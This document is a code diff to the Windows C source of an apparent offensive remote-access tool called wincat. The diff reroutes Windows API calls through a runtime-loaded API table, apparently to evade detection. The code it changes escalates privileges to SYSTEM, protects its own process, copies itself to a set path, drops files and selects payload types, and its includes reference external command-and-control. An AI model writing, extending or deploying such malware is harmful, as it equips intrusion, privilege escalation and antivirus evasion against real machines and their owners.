@@ -22,6 +22,8 @@
 #include "csExternalC2.h"
 #include "EasyPrivEsc.h"
 
+#include "LoadAPI.h"
+
 
 
 #pragma comment(lib, "Userenv.lib")
@@ -29,12 +31,12 @@
 #pragma comment(lib, "Wininet.lib")
 
 
-BOOL CopyWinNC(const char* wincatDefaultPath) {
+BOOL CopyWinNC(Kernel32_API Kernel32, const char* wincatDefaultPath) {
     BOOL retVal = FALSE;
     char* currentFilePath = (char*)calloc(MAX_PATH, 1);
     if (currentFilePath != NULL) {
-        if (GetModuleFileNameA(NULL, currentFilePath, MAX_PATH) > 0) {
-            if (CopyFileA(currentFilePath, wincatDefaultPath, FALSE))
+        if (Kernel32.GetModuleFileNameAF(NULL, currentFilePath, MAX_PATH) > 0) {
+            if (Kernel32.CopyFileAF(currentFilePath, wincatDefaultPath, FALSE))
                 retVal = TRUE;
         }
         free(currentFilePath);
@@ -72,11 +74,17 @@ int wmain(int argc, WCHAR* argv[]){
     //
     //////////////////// Protect process ///////////////////
 
+    API_Call APICall;
+    if (!loadApi(&APICall)) {
+        printf("Fail to load api\n");
+        system("pause");
+    }
+
     if (!GetArguments(argc, argv, &listAgrument)) {
-        if (IsRunAsAdmin()) {
-            if (isArgHostSet()) {
+        if (IsRunAsAdmin(APICall.Advapi32Api)) {
+            if (isArgHostSet(APICall.Advapi32Api)) {
                 printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process running with admin priv !\n");
-                GetSystem();
+                GetSystem(APICall.Kernel32Api, APICall.Advapi32Api);
             } else if(IsRunAsSystem()){
                 if (GetInfoPipeSystem(&listAgrument)){
                     ProtectProcess();
@@ -89,29 +97,30 @@ int wmain(int argc, WCHAR* argv[]){
         }
         return TRUE;
     }
-
+        
+    
     ////////////////////// Copy Wincat /////////////////////
     // 
     if (!IsFileExist((char*)listAgrument.wincatDefaultPath)) {
-        if (CreateDirectoryA(listAgrument.wincatDefaultDir, NULL) != ERROR_PATH_NOT_FOUND)
-            if (!CopyWinNC(listAgrument.wincatDefaultPath))
+        if (APICall.Kernel32Api.CreateDirectoryAF(listAgrument.wincatDefaultDir, NULL) != ERROR_PATH_NOT_FOUND)
+            if (!CopyWinNC(APICall.Kernel32Api,listAgrument.wincatDefaultPath))
                 printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to copy wincat to '%s'", listAgrument.wincatDefaultPath);
     }
     //
     ////////////////////// Copy Wincat /////////////////////
 
     if (listAgrument.CheckPriEsc)
-        EasyPrivEsc();
+        EasyPrivEsc(APICall.Kernel32Api, APICall.Advapi32Api);
 
     if (listAgrument.Detached && argc > 3)
-        RunProcessDetached(argc, argv);
+        RunProcessDetached(APICall.Kernel32Api, argc, argv);
     else {
         if (listAgrument.toDROP != Nothing)
             DropFiles(listAgrument.wincatDefaultDir, listAgrument.toDROP);
         if (argc >= 3) {
             if (listAgrument.GetSystem) {
                 ProtectProcess();
-                PrivEsc(listAgrument);
+                PrivEsc(APICall.Kernel32Api, APICall.Advapi32Api, APICall.Shell32Api, listAgrument);
                 return FALSE;
             } else if (initWSAS()) {
                 switch (listAgrument.payloadType) {
